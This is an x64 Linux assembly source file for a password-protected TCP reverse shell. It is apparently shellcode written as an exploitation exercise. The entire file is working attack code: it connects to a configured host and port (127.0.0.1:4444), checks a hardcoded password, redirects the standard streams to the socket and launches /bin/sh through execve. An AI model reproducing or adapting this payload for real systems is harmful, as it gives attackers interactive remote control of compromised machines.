; =================================================
;   Password protected x64 TCP Reverse Shell
;   Author: Alan Vivona
; =================================================

global _start

    ; Syscall numbers
    syscalls.socket  equ 0x29
    syscalls.bind    equ 0x31
    syscalls.listen  equ 0x32
    syscalls.connect equ 0x2a
    syscalls.accept  equ 0x2b
    syscalls.close   equ 0x03
    syscalls.dup2    equ 0x21
    syscalls.write   equ 0x01
    syscalls.read    equ 0x00
    syscalls.execve  equ 0x3b

    ; Constant definitions
    ipv4    equ 0x02            ; AF_INET
    ipv4.addressLen equ 0x10 
    tcp     equ 0x01            ; SOCK_STREAM

    ; Standard streams
    standardIO.in   equ 0x00
    standardIO.out  equ 0x01
    standardIO.err  equ 0x02

    ;:> echo -n '//bin/sh' | rev | xxd
    ;:  00000000: 6873 2f6e 6962 2f2f hs/nib//
    binshString     equ 0x68732f6e69622f2f

    ; Configs
    config.max_cons equ 0x2
    config.password equ 0x4d54454c214e4945  ; MTEL!NIE > LETMEIN!
    config.target   equ 0x100007f5c110002   ; tcp://127.0.0.1:4444

section .text

_start:
    
    ; 1 - Create socket
    push syscalls.socket
    pop rax
    cdq
    push ipv4
    pop rdi
    push tcp
    pop rsi
    syscall
    mov r15, rax ; save fd into r15

    ; 2 - Connect to target
    xchg rax, rdi
    mov rcx, config.target
    push rcx
    mov rsi, rsp
    push ipv4.addressLen
    pop rdx
    push syscalls.connect
    pop rax
    syscall

    ; Read password from the client fd
    read_pass:
        xor rax, rax    ; read syscall == 0x00
        mov rdi, r15    ; rdi = fd
        push 0x04
        pop rdx         ; rdx = input size
        sub rsp, rdx
        mov rsi, rsp    ; rsi => buffer
        syscall
    ; Check password
        mov rax, config.password
        mov rdi, rsi
        scasq
    jne read_pass

    ; 3 - Duplicate std streams
    mov rdi, r15 ; restore socket fd into rdi
    push 0x02
    pop rsi
    loop_through_stdfs:
        push syscalls.dup2
        pop rax
        syscall
        dec rsi
    jns loop_through_stdfs

    ; 4 - Execve
    xor rdx, rdx

    push rdx ; First NULL push    
    mov rbx, binshString ; push /bin//sh in reverse
    push rbx     ; store /bin//sh address in RDI
    mov rdi, rsp 
    
    push rdx ; Second NULL push
    mov rdx, rsp
    push rdi     ; set RSI to address of /bin//sh
    mov rsi, rsp
    
    push syscalls.execve
    pop rax
    
    syscall